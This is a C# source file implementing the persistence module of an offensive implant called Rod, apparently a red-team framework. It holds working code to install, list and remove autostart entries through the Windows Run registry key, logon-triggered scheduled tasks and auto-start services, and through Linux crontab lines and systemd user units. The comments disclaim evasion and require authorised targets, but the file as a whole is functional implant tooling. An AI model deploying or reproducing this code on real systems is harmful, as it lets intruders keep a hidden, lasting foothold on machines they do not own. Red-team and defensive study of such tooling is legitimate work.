using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text;
using Microsoft.Win32;
using Rod.V1;

namespace Rod.Implant.Internal;

// Holds the persist.* verbs the reference implant advertises (architecture.md
// Sec 10.1, ADR 0004). They cover the documented persistence surfaces every
// system administrator and offensive-security curriculum describes: on Windows
// the Run registry key, scheduled tasks, and services; on Linux cron and
// systemd user units. Install, list, and remove round-trip against these
// surfaces. Novel or stealth persistence techniques remain out-of-tree
// (ADR 0004).
//
// Argument shape, shared by install and remove:
//
//   persist.install <mechanism> <name> <payload>
//   persist.remove   <mechanism> <name>
//   persist.list     [<mechanism>]
//
// where mechanism is one of runkey, schtasks, service (Windows) or cron,
// systemd (Linux). The <name> identifies the entry so remove can target it;
// for runkey it is the registry value name, for schtasks the task name, for
// service the service name, for cron an arbitrary tag this handler stashes in
// a comment alongside the line, and for systemd the unit basename (without the
// .service suffix).
//
// As with the other reference handlers, this performs no evasion, no
// obfuscation, and no destructive behavior beyond installing or removing the
// requested entry (RESPONSIBLE-USE.md, architecture.md Sec 7). The operator is
// responsible for targeting only systems they are authorized to test.

internal static class Persist
{
    // The documented mechanisms, in the order persist.list reports them.
    private static readonly string[] Mechanisms = { "runkey", "schtasks", "service", "cron", "systemd" };

    /// <summary>
    /// Installs a documented persistence entry. The mechanism decides the
    /// channel; the platform decides which mechanisms are available. A mechanism
    /// that does not apply on the current OS reports Failed with a clear cause
    /// rather than silently no-opping.
    /// </summary>
    public static (TaskOutcome Outcome, string Output) Install(string arguments)
    {
        if (!TryParseInstallArgs(arguments, out var mechanism, out var name, out var payload))
            return (TaskOutcome.Failed, "persist.install expects '<mechanism> <name> <payload>'");

        switch (mechanism)
        {
            case "runkey":
            case "schtasks":
            case "service":
                if (!OperatingSystem.IsWindows())
                    return (TaskOutcome.Failed,
                        $"persist.install {mechanism} is a Windows-only mechanism; not supported on this OS");
                return InstallWindows(mechanism, name, payload);
            case "cron":
            case "systemd":
                return InstallLinux(mechanism, name, payload);
            default:
                return (TaskOutcome.Failed,
                    $"persist.install: unknown mechanism '{mechanism}' (expected one of {string.Join(", ", Mechanisms)})");
        }
    }

    /// <summary>
    /// Reverses a persist.install for the same mechanism and name. Tolerates an
    /// already-absent entry as Succeeded (idempotent cleanup) so a retry after a
    /// partial install does not strand the operator on a Failed.
    /// </summary>
    public static (TaskOutcome Outcome, string Output) Remove(string arguments)
    {
        if (!TryParseRemoveArgs(arguments, out var mechanism, out var name))
            return (TaskOutcome.Failed, "persist.remove expects '<mechanism> <name>'");

        switch (mechanism)
        {
            case "runkey":
            case "schtasks":
            case "service":
                if (!OperatingSystem.IsWindows())
                    return (TaskOutcome.Failed,
                        $"persist.remove {mechanism} is a Windows-only mechanism; not supported on this OS");
                return RemoveWindows(mechanism, name);
            case "cron":
            case "systemd":
                return RemoveLinux(mechanism, name);
            default:
                return (TaskOutcome.Failed,
                    $"persist.remove: unknown mechanism '{mechanism}' (expected one of {string.Join(", ", Mechanisms)})");
        }
    }

    /// <summary>
    /// Enumerates the installed entries across the documented mechanisms the
    /// current platform supports, one line per entry as
    /// "&lt;mechanism&gt; &lt;name&gt;". An optional argument filters to a single
    /// mechanism. The output is a listing; no payloads are dumped (a Run key's
    /// command, a unit's ExecStart) since the operator can read them with the
    /// host's own tools once they know the names.
    /// </summary>
    public static (TaskOutcome Outcome, string Output) List(string arguments)
    {
        var filter = arguments.Trim();
        if (filter.Length > 0 && !IsKnownMechanism(filter))
            return (TaskOutcome.Failed,
                $"persist.list: unknown mechanism '{filter}' (expected one of {string.Join(", ", Mechanisms)})");

        var lines = new List<string>();
        var windows = OperatingSystem.IsWindows();
        foreach (var m in Mechanisms)
        {
            if (filter.Length > 0 && m != filter)
                continue;
            var isWindowsMech = m is "runkey" or "schtasks" or "service";
            if (isWindowsMech != windows)
                continue;
            try
            {
                foreach (var n in ListMechanism(m))
                    lines.Add($"{m} {n}");
            }
            catch (Exception ex)
            {
                // Listing one mechanism failing does not sink the whole report;
                // note it and continue so the operator still sees the others.
                lines.Add($"{m} (listing failed: {ex.Message})");
            }
        }
        return lines.Count == 0
            ? (TaskOutcome.Succeeded, "(no entries)")
            : (TaskOutcome.Succeeded, string.Join("\n", lines));
    }

    // --- Windows mechanisms -------------------------------------------------

    // Installs a Run registry value, a scheduled task, or a service via the
    // built-in reg / schtasks / sc tooling (and direct registry writes for the
    // runkey), keeping the OPSEC surface of a reference implant honest.
    [SupportedOSPlatform("windows")]
    private static (TaskOutcome, string) InstallWindows(string mechanism, string name, string payload)
    {
        switch (mechanism)
        {
            case "runkey":
                // HKCU Run key; the per-user autorun surface every Windows admin
                // guide documents. A direct registry write avoids a reg.exe
                // round-trip and keeps the install idempotent.
                try
                {
                    using var key = Registry.CurrentUser.CreateSubKey(
                        @"Software\Microsoft\Windows\CurrentVersion\Run", writable: true);
                    key.SetValue(name, payload, RegistryValueKind.String);
                    return (TaskOutcome.Succeeded, $"installed runkey {name} -> {payload}");
                }
                catch (Exception ex)
                {
                    return (TaskOutcome.Failed, $"install runkey {name}: {ex.Message}");
                }
            case "schtasks":
                var (scOutcome, scOut) = RunCaptured(
                    "schtasks", $"/create /tn {name} /tr {payload} /sc onlogon /f");
                if (scOutcome == TaskOutcome.Failed)
                    return (TaskOutcome.Failed, $"install schtasks {name}: {scOut}");
                return (TaskOutcome.Succeeded, $"installed schtasks {name} -> {payload}");
            case "service":
                // sc create registers the service; binPath= is the payload. Note
                // the space after the flag name is required by sc's argv quirk.
                var (svcOutcome, svcOut) = RunCaptured(
                    "sc", $"create {name} binPath= {payload} start= auto");
                if (svcOutcome == TaskOutcome.Failed)
                    return (TaskOutcome.Failed, $"install service {name}: {svcOut}");
                return (TaskOutcome.Succeeded, $"installed service {name} -> {payload}");
        }
        return (TaskOutcome.Failed, $"persist.install: unreachable mechanism {mechanism}");
    }

    // Reverses install for the three Windows mechanisms. An absent entry is
    // reported Succeeded so retries after partial installs clean up rather than
    // strand the operator.
    [SupportedOSPlatform("windows")]
    private static (TaskOutcome, string) RemoveWindows(string mechanism, string name)
    {
        switch (mechanism)
        {
            case "runkey":
                try
                {
                    using var key = Registry.CurrentUser.OpenSubKey(
                        @"Software\Microsoft\Windows\CurrentVersion\Run", writable: true);
                    if (key is null || key.GetValue(name) is null)
                        return (TaskOutcome.Succeeded, $"removed runkey {name} (already absent)");
                    key.DeleteValue(name, throwOnMissingValue: false);
                    return (TaskOutcome.Succeeded, $"removed runkey {name}");
                }
                catch (Exception ex)
                {
                    return (TaskOutcome.Failed, $"remove runkey {name}: {ex.Message}");
                }
            case "schtasks":
                var (scOutcome, scOut) = RunCaptured("schtasks", $"/delete /tn {name} /f");
                if (scOutcome == TaskOutcome.Failed
                    && scOut.Contains("does not exist", StringComparison.OrdinalIgnoreCase))
                    return (TaskOutcome.Succeeded, $"removed schtasks {name} (already absent)");
                if (scOutcome == TaskOutcome.Failed)
                    return (TaskOutcome.Failed, $"remove schtasks {name}: {scOut}");
                return (TaskOutcome.Succeeded, $"removed schtasks {name}");
            case "service":
                var (svcOutcome, svcOut) = RunCaptured("sc", $"delete {name}");
                if (svcOutcome == TaskOutcome.Failed
                    && svcOut.Contains("does not exist", StringComparison.OrdinalIgnoreCase))
                    return (TaskOutcome.Succeeded, $"removed service {name} (already absent)");
                if (svcOutcome == TaskOutcome.Failed)
                    return (TaskOutcome.Failed, $"remove service {name}: {svcOut}");
                return (TaskOutcome.Succeeded, $"removed service {name}");
        }
        return (TaskOutcome.Failed, $"persist.remove: unreachable mechanism {mechanism}");
    }

    // Enumerates the installed entries for one Windows mechanism: Run key values
    // (names), scheduled tasks (names), or services (names).
    private static IEnumerable<string> ListMechanism(string mechanism)
    {
        if (OperatingSystem.IsWindows())
            return ListWindows(mechanism);
        return ListLinux(mechanism);
    }

    [SupportedOSPlatform("windows")]
    private static IEnumerable<string> ListWindows(string mechanism)
    {
        switch (mechanism)
        {
            case "runkey":
                using (var key = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Run", writable: false))
                {
                    if (key is null)
                        yield break;
                    foreach (var name in key.GetValueNames())
                    {
                        if (name.Length == 0 || name == "(Default)")
                            continue;
                        yield return name;
                    }
                }
                yield break;
            case "schtasks":
                var (scOutcome, scOut) = RunCaptured("schtasks", "/query /fo csv /nh");
                if (scOutcome == TaskOutcome.Failed)
                    yield break;
                foreach (var line in scOut.Split('\n', StringSplitOptions.RemoveEmptyEntries))
                {
                    var trimmed = line.Trim();
                    var comma = trimmed.IndexOf(',');
                    if (comma < 0)
                        continue;
                    var first = trimmed.Substring(0, comma).Trim('"');
                    if (first.Length == 0 || first.Equals("TaskName", StringComparison.OrdinalIgnoreCase))
                        continue;
                    if (first == "\\")
                        continue;
                    yield return first;
                }
                yield break;
            case "service":
                var (svcOutcome, svcOut) = RunCaptured("sc", "query type= service state= all");
                if (svcOutcome == TaskOutcome.Failed)
                    yield break;
                foreach (var line in svcOut.Split('\n', StringSplitOptions.RemoveEmptyEntries))
                {
                    var trimmed = line.Trim();
                    if (trimmed.StartsWith("SERVICE_NAME:", StringComparison.OrdinalIgnoreCase))
                    {
                        var name = trimmed.Substring("SERVICE_NAME:".Length).Trim();
                        if (name.Length > 0)
                            yield return name;
                    }
                }
                yield break;
        }
        yield break;
    }

    // --- Linux mechanisms ---------------------------------------------------

    // Installs a cron line or a systemd user unit. For cron the payload is
    // appended to the per-user crontab with a Rod marker comment so remove can
    // target it by name; for systemd a per-user unit file is written and
    // daemon-reload invoked.
    private static (TaskOutcome, string) InstallLinux(string mechanism, string name, string payload)
    {
        switch (mechanism)
        {
            case "cron":
                // Read the current crontab, append a tagged line, write it back
                // through crontab -. The tag comment lets remove find it without
                // parsing the crontab grammar.
                var current = ReadCrontab();
                var marker = $"# Rod:{name}";
                if (HasCronLine(current, marker))
                    return (TaskOutcome.Succeeded, $"installed cron {name} (already present)");
                var updated = current + marker + "\n" + payload + "\n";
                var (cronOutcome, cronOut) = RunCapturedWithStdin("crontab", "-", updated);
                if (cronOutcome == TaskOutcome.Failed)
                    return (TaskOutcome.Failed, $"install cron {name}: {cronOut}");
                return (TaskOutcome.Succeeded, $"installed cron {name} -> {payload}");
            case "systemd":
                // Per-user unit under ~/.config/systemd/user/, then daemon-reload
                // so the new unit is picked up. The name is the unit basename.
                var dir = SystemdUserDir();
                try
                {
                    Directory.CreateDirectory(dir);
                }
                catch (Exception ex)
                {
                    return (TaskOutcome.Failed, $"install systemd {name}: mkdir: {ex.Message}");
                }
                var path = Path.Combine(dir, name + ".service");
                try
                {
                    File.WriteAllText(path, SystemdUnit(name, payload));
                }
                catch (Exception ex)
                {
                    return (TaskOutcome.Failed, $"install systemd {name}: write: {ex.Message}");
                }
                var (drOutcome, drOut) = RunCaptured("systemctl", "--user daemon-reload");
                if (drOutcome == TaskOutcome.Failed)
                    return (TaskOutcome.Failed, $"install systemd {name}: daemon-reload: {drOut}");
                return (TaskOutcome.Succeeded, $"installed systemd {name} -> {path}");
        }
        return (TaskOutcome.Failed, $"persist.install: unreachable mechanism {mechanism}");
    }

    // Reverses install for the two Linux mechanisms. Like the Windows path, an
    // already-absent entry is reported Succeeded.
    private static (TaskOutcome, string) RemoveLinux(string mechanism, string name)
    {
        switch (mechanism)
        {
            case "cron":
                var current = ReadCrontab();
                if (!HasCronLine(current, $"# Rod:{name}"))
                    return (TaskOutcome.Succeeded, $"removed cron {name} (already absent)");
                var updated = RemoveCronBlock(current, name);
                var (cronOutcome, cronOut) = RunCapturedWithStdin("crontab", "-", updated);
                if (cronOutcome == TaskOutcome.Failed)
                    return (TaskOutcome.Failed, $"remove cron {name}: {cronOut}");
                return (TaskOutcome.Succeeded, $"removed cron {name}");
            case "systemd":
                var path = Path.Combine(SystemdUserDir(), name + ".service");
                if (!File.Exists(path))
                    return (TaskOutcome.Succeeded, $"removed systemd {name} (already absent)");
                try
                {
                    File.Delete(path);
                }
                catch (Exception ex)
                {
                    return (TaskOutcome.Failed, $"remove systemd {name}: {ex.Message}");
                }
                _ = RunCaptured("systemctl", "--user daemon-reload");
                return (TaskOutcome.Succeeded, $"removed systemd {name}");
        }
        return (TaskOutcome.Failed, $"persist.remove: unreachable mechanism {mechanism}");
    }

    private static IEnumerable<string> ListLinux(string mechanism)
    {
        switch (mechanism)
        {
            case "cron":
                foreach (var n in ListCronNames(ReadCrontab()))
                    yield return n;
                yield break;
            case "systemd":
                var dir = SystemdUserDir();
                string[] entries;
                try
                {
                    entries = Directory.GetFiles(dir, "*.service");
                }
                catch (DirectoryNotFoundException)
                {
                    yield break;
                }
                catch (IOException)
                {
                    yield break;
                }
                foreach (var full in entries)
                {
                    var fn = Path.GetFileName(full);
                    if (fn.EndsWith(".service", StringComparison.Ordinal))
                        yield return fn.Substring(0, fn.Length - ".service".Length);
                }
                yield break;
        }
        yield break;
    }

    // Returns the current per-user crontab as a string, or "" if none is
    // installed or crontab is unavailable. Failures here are treated as "empty
    // crontab" so install proceeds with a clean append and list reports nothing.
    private static string ReadCrontab()
    {
        var (outcome, output) = RunCaptured("crontab", "-l");
        if (outcome == TaskOutcome.Failed)
            return "";
        if (output.Contains("no crontab for", StringComparison.OrdinalIgnoreCase))
            return "";
        return output;
    }

    // Reports whether the crontab body already contains the given marker, so
    // install is idempotent and remove can detect absence.
    private static bool HasCronLine(string crontab, string marker)
    {
        foreach (var line in crontab.Split('\n'))
            if (line.Trim() == marker)
                return true;
        return false;
    }

    // Strips the marker comment and the single payload line that follows it.
    private static string RemoveCronBlock(string crontab, string name)
    {
        var marker = $"# Rod:{name}";
        var lines = crontab.Split('\n');
        var kept = new List<string>(lines.Length);
        for (var i = 0; i < lines.Length; i++)
        {
            if (lines[i].Trim() == marker)
            {
                i++; // skip the payload line install wrote after the marker
                continue;
            }
            kept.Add(lines[i]);
        }
        return string.Join("\n", kept);
    }

    // Parses the Rod markers out of the crontab body to recover the names
    // install recorded.
    private static IEnumerable<string> ListCronNames(string crontab)
    {
        foreach (var line in crontab.Split('\n'))
        {
            var trimmed = line.Trim();
            if (trimmed.StartsWith("# Rod:", StringComparison.Ordinal))
                yield return trimmed.Substring("# Rod:".Length);
        }
    }

    // The per-user systemd unit directory. XDG_CONFIG_HOME is honored when set;
    // otherwise ~/.config is used.
    private static string SystemdUserDir()
    {
        var xdg = Environment.GetEnvironmentVariable("XDG_CONFIG_HOME");
        if (!string.IsNullOrEmpty(xdg))
            return Path.Combine(xdg, "systemd", "user");
        var home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        return Path.Combine(home, ".config", "systemd", "user");
    }

    // Renders a minimal per-user service unit. The payload becomes ExecStart;
    // everything else is the documented minimum systemd expects.
    private static string SystemdUnit(string name, string payload)
        => string.Join("\n", new[]
        {
            "[Unit]",
            $"Description=Rod-installed unit {name}",
            "",
            "[Service]",
            $"ExecStart={payload}",
            "Restart=no",
            "",
            "[Install]",
            "WantedBy=default.target",
            "",
        });

    // --- Argument parsing ---------------------------------------------------

    // Splits "<mechanism> <name> <payload...>" into the three parts. The payload
    // keeps its internal whitespace; only the first two tokens are the mechanism
    // and name. Returns false when fewer than three fields are present.
    internal static bool TryParseInstallArgs(
        string arguments, out string mechanism, out string name, out string payload)
    {
        mechanism = string.Empty;
        name = string.Empty;
        payload = string.Empty;
        var fields = arguments.Split(StringSeparators.Space, StringSplitOptions.RemoveEmptyEntries);
        if (fields.Length < 3)
            return false;
        mechanism = fields[0];
        name = fields[1];
        payload = string.Join(' ', fields, 2, fields.Length - 2);
        return true;
    }

    // Splits "<mechanism> <name>" into the two parts. Returns false when the
    // field count is not exactly two.
    internal static bool TryParseRemoveArgs(string arguments, out string mechanism, out string name)
    {
        mechanism = string.Empty;
        name = string.Empty;
        var fields = arguments.Split(StringSeparators.Space, StringSplitOptions.RemoveEmptyEntries);
        if (fields.Length != 2)
            return false;
        mechanism = fields[0];
        name = fields[1];
        return true;
    }

    private static bool IsKnownMechanism(string m)
        => Array.Exists(Mechanisms, known => known == m);

    // --- Process helpers ----------------------------------------------------

    // Runs a platform command, capturing combined stdout/stderr. A non-zero exit
    // is Failed with the output captured so the operator sees the cause.
    private static (TaskOutcome Outcome, string Output) RunCaptured(string fileName, string arguments)
    {
        var psi = new ProcessStartInfo
        {
            FileName = fileName,
            Arguments = arguments,
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
        };
        try
        {
            using var process = Process.Start(psi);
            if (process is null)
                return (TaskOutcome.Failed, $"failed to start {fileName}");
            var stdout = process.StandardOutput.ReadToEnd();
            var stderr = process.StandardError.ReadToEnd();
            process.WaitForExit();
            var output = ComposeOutput(stdout, stderr);
            if (process.ExitCode != 0)
                return (TaskOutcome.Failed, output.Length > 0 ? output : $"exit code {process.ExitCode}");
            return (TaskOutcome.Succeeded, output);
        }
        catch (Exception ex)
        {
            return (TaskOutcome.Failed, ex.Message);
        }
    }

    // Runs a platform command with the given stdin body, capturing combined
    // stdout/stderr. Used by the cron path to feed the new crontab through
    // `crontab -`.
    private static (TaskOutcome Outcome, string Output) RunCapturedWithStdin(
        string fileName, string arguments, string stdin)
    {
        var psi = new ProcessStartInfo
        {
            FileName = fileName,
            Arguments = arguments,
            UseShellExecute = false,
            RedirectStandardInput = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
        };
        try
        {
            using var process = Process.Start(psi);
            if (process is null)
                return (TaskOutcome.Failed, $"failed to start {fileName}");
            process.StandardInput.Write(stdin);
            process.StandardInput.Close();
            var stdout = process.StandardOutput.ReadToEnd();
            var stderr = process.StandardError.ReadToEnd();
            process.WaitForExit();
            var output = ComposeOutput(stdout, stderr);
            if (process.ExitCode != 0)
                return (TaskOutcome.Failed, output.Length > 0 ? output : $"exit code {process.ExitCode}");
            return (TaskOutcome.Succeeded, output);
        }
        catch (Exception ex)
        {
            return (TaskOutcome.Failed, ex.Message);
        }
    }

    // Joins stdout and stderr on a newline so a Failed outcome shows both.
    private static string ComposeOutput(string stdout, string stderr)
    {
        if (stdout.Length == 0)
            return stderr;
        if (stderr.Length == 0)
            return stdout;
        return stdout + "\n" + stderr;
    }

    private static class StringSeparators
    {
        public static readonly char[] Space = { ' ' };
    }
}
